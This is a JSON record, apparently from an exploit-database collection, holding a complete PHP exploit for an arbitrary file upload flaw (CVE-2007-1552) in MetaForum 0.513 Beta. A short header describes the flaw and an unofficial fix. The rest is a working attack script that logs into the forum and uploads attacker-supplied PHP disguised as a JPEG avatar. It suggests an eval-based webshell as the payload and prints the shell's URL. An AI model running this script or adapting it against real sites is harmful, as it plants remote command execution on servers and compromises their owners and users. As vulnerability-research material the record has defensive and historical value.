{
  "id": "3516",
  "title": "MetaForum 0.513 Beta - Arbitrary File Upload",
  "cve": "CVE-2007-1552",
  "vuln_type": "file_upload",
  "code": "<?php\r\n/*---------------------------------------------------------*\\\r\nMetaForum <= 0.513 Beta - Remote file upload Vulnerability\r\n\r\n[|Description:|]\r\nA security bug has been discovered in MetaForum 0.513 Beta.\r\nThis bug can be used by an attacker to upload a malicious php file on the server.\r\nDuring the upload, the MIME type of the file is the only verified parameter. The extention isn't.\r\nThis enables a attacker to fake the MIME type of a php file so that it is considered as an image.\r\n\r\n[|Advisory:|]\r\nhttp://www.aeroxteam.fr/advisory-MetaForum-0.513b.txt\r\n\r\n[|Solution:|] (unofficial)\r\nReplace line 110 in the file usercp.php by:\r\nif (($_FILES['imagefile']['type'] == \"image/jpeg\" || $_FILES['imagefile']['type'] == \"image/pjpeg\" || $_FILES['imagefile']['type'] == \"image/png\" || $_FILES['imagefile']['type'] == \"image/gif\") && in_array(strtolower(substr(strrchr($_FILES['imagefile']['name'], '.'),1)), array('gif', 'jpg', 'jpeg', 'png')))\r\n\r\nC0d3d by Gu1ll4um3r0m41n (aeroxteam --[at]-- gmail --[dot]-- com)\r\nfor AeroX & NeoAlpha (AeroXteam.fr -- Neoalpha.fr)\r\n(C)opyleft 2007\r\nGr33tz: Math., Syntax ERROR, Barma, NeoMorphS, Snake91, Spamm, Kad, Nitr0, Jethro And everybody from #aerox\r\n\\*---------------------------------------------------------*/\r\nif(count($argv) == 6) {\r\n\thead();\r\n\techo \"PHP code to write (ex: <?php eval(stripslashes(\\$_GET['cmd'])); ?>) :\\r\\n\";\r\n\t$phpcode = trim(fgets(STDIN));\r\n\techo \"\\r\\n[+] Connection... \";\r\n\t$sock = @fsockopen($argv[1], 80, $eno, $estr, 30);\r\n\tif (!$sock) {\r\n\t\tdie(\"Failed\\r\\n\\r\\nCould not connect to \".$argv[1].\" on the port 80 !\");\r\n\t}\r\n\techo \"OK\\r\\n\";\r\n\techo \"[+] Login to account... \";\r\n\t$reqlogin = \"POST \".$argv[2].\"index.php?shard=login&action=proc_login HTTP/1.1\\r\\n\";\r\n\t$reqlogin .= \"Host: \".$argv[1].\"\\r\\n\";\r\n\t$reqlogin .= \"Accept: */*\\r\\n\";\r\n\t$reqlogin .= \"Connection: Close\\r\\n\";\r\n\t$reqlogin .= \"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n\t$reqlogin .= \"Content-Length: \".strlen(\"login_name=\".$argv[3].\"&login_pass=\".$argv[4]).\"\\r\\n\\r\\n\";\r\n\t$reqlogin .= \"login_name=\".$argv[3].\"&login_pass=\".$argv[4];\r\n\tfwrite($sock, $reqlogin);\r\n\twhile(!feof($sock)) {\r\n\t\t$buffer = fgets($sock);\r\n\t\tif(preg_match(\"`Set-Cookie: \".$argv[5].\"userID=(.*?);`\", $buffer, $idtmp)) { $id = $idtmp[1]; }\r\n\t}\r\n\tif(empty($id)) {\r\n\t\tdie(\"Failed\\r\\n\\r\\nCould not login as \".$argv[3].\" !\");\r\n\t} else {\r\n\t\techo \"OK\\r\\n\";\r\n\t}\r\n\tfclose($sock);\r\n\r\n\techo \"[+] Sending of the file... \";\r\n\t$sock = @fsockopen($argv[1], 80, $eno, $estr, 30);\r\n\tif (!$sock) {\r\n\t\tdie(\"Failed\\r\\n\\r\\nCould not connect to \".$argv[1].\" on the port 80 !\");\r\n\t}\r\n\t$requp = \"POST \".$argv[2].\"index.php?shard=usercp&action=g_avatar HTTP/1.1\\r\\n\";\r\n\t$requp .= \"Host: \".$argv[1].\"\\r\\n\";\r\n\t$requp .= \"Accept: */*\\r\\n\";\r\n\t$requp .= \"Connection: Close\\r\\n\";\r\n\t$requp .= \"Cookie: \".$argv[5].\"username=\".$argv[3].\"; \".$argv[5].\"userID=\".$id.\"; \".$argv[5].\"password=\".sha1($argv[4]).\"\\r\\n\";\r\n\t$requp .= \"Content-Type: multipart/form-data; boundary=--------------268742553814512\\r\\n\";\r\n\t$requp2 .= \"----------------268742553814512\\r\\n\";\r\n\t$requp2 .= \"Content-Disposition: form-data; name=\\\"upload_flag\\\";\\r\\n\\r\\n\";\r\n\t$requp2 .= \"true\\r\\n\";\r\n\t$requp2 .= \"----------------268742553814512\\r\\n\";\r\n\t$requp2 .= \"Content-Disposition: form-data; name=\\\"imagefile\\\"; filename=\\\"owned.php\\\";\\r\\n\";\r\n\t$requp2 .= \"Content-Type: image/jpeg\\r\\n\\r\\n\";\r\n\t$requp2 .= $phpcode.\"\\r\\n\";\r\n\t$requp2 .= \"----------------268742553814512\\r\\n\";\r\n\t$requp2 .= \"Content-Disposition: form-data; name=\\\"Submit\\\";\\r\\n\\r\\n\";\r\n\t$requp2 .= \"Submit\\r\\n\";\r\n\t$requp2 .= \"----------------268742553814512--\\r\\n\";\r\n\t$requp .= \"Content-Length: \".strlen($requp2).\"\\r\\n\\r\\n\";\r\n\t$requp .= $requp2;\r\n\tfwrite($sock, $requp);\r\n\twhile(!feof($sock)) {\r\n\t\tif(preg_match(\"`<img src='images/\".$argv[3].\".php'`\", fgets($sock))) { $ok = 1; }\r\n\t}\r\n\tif($ok == 1) {\r\n\t\techo \"OK\\r\\n\\r\\nYou can access the file at:\\r\\nhttp://\".$argv[1].$argv[2].\"images/\".$argv[3].\".php\\r\\n\\r\\nThank for using this exploit !\";\r\n\t} else {\r\n\t\tdie(\"Failed\\r\\n\\r\\nMaybe not vulnerable ?!\");\r\n\t}\r\n} else {\r\n\tusage();\r\n}\r\nfunction usage() {\r\n\techo \"+----------------------------------------------------------------+\\r\\n\";\r\n\techo \"|            MetaForum <= 0.513_beta Remote file upload          |\\r\\n\";\r\n\techo \"|             By Gu1ll4um3r0m41n for AeroX & NeoAlpha            |\\r\\n\";\r\n\techo \"| Usage: php exploit.php site.com /path/ user pass cookie_prefix |\\r\\n\";\r\n\techo \"+----------------------------------------------------------------+\\r\\n\";\r\n}\r\nfunction head() {\r\n\techo \"+----------------------------------------------+\\r\\n\";\r\n\techo \"|  MetaForum <= 0.513_beta Remote file upload  |\\r\\n\";\r\n\techo \"|   By Gu1ll4um3r0m41n for AeroX & NeoAlpha    |\\r\\n\";\r\n\techo \"+----------------------------------------------+\\r\\n\\r\\n\";\r\n}\r\n?>\r\n\r\n# milw0rm.com [2007-03-19]",
  "url": "https://www.exploit-db.com/exploits/3516"
}